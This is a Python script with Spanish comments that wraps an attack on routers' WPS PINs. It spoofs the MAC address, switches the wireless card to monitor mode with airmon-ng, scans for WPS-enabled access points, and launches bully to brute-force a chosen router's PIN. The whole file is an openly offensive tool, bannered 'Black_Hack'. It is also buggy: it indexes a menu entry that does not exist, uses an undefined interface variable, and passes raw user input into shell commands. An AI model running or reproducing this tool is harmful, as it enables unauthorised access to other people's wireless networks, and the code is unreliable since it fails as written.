#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ LIBRERIAS $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
import os, time, threading, io

## Crador Smp_A
# Fecha 25.7.2020
# Licencia Open soft GNU
# Nombre programa CronoS WiFi telefono
# Tipo Script shell
# Hack pin wps Wifi basado en bully 
# lenguaje Python3 
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ PRESENTACION TERMINAL $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
os.system('clear')
print("\033[1;31;1m ")
os.system('figlet        Smp_A')
print("		 Black_Hack")                     	
print("\033[1;37;1m ")
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Variables principales $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Variables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
listamenu=["Opciones:","1) Scaner red ", "2) CronoS WiFi","3) Exit"]#Menu Princcipal
key=0
exit=False
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OPciones MEnu ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def menu():
	print("     "+listamenu[0])
	print(listamenu[1])
	print(listamenu[2])
	print(listamenu[3])
	print(listamenu[4])
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ FUNCIONES PRINCIPALES $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ CONFIGURACION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def scan(wlan):
	os.system("ifconfig")
	wlan=input("Introduzca Wlan: ")
	if(wlan=="wlan0mon" or wlan== "wlan1mon"):
		wlan=wlan
	else:
		print("Procesando")
		os.system('ifconfig '+wlan+' down')
		time.sleep(1)
		os.system('macchanger -A '+wlan)
		time.sleep(1)
		os.system('ifconfig '+wlan+' up') 
		time.sleep(1)
		os.system('airmon-ng check kill')
		time.sleep(1)
		os.system('airmon-ng start '+wlan)
		time.sleep(1)
		os.system('airmon-ng check '+wlan)
		time.sleep(1)
		wlan=(wlan+"mon")
	print(wlan)	
	os.system('airodump-ng -i '+wlan+' --wps --manufacturer')
	return wlan
def attack(wlan):
	mac=input("seleccione mac : ")
	chanel=input("seleccione chanel : ")
	os.system('x-terminal-emulator -e bully '+wlan+' -b '+mac+' -c '+chanel+' -d -v 4')
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
while exit==False:
	menu()
	key=(int(input()))
	if (key==1):
		scan(wlan)
	elif (key==2):
		attack(wlan)
	elif (key==3):
		os.system('airmon-ng stop wlan0mon')
		os.system('ifconfig wlan0 down')
		os.system('iwconfig wlan0 mode managed')
		os.system('ifconfig wlan0 up')
		os.system('service network-manager start')
		exit=True
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
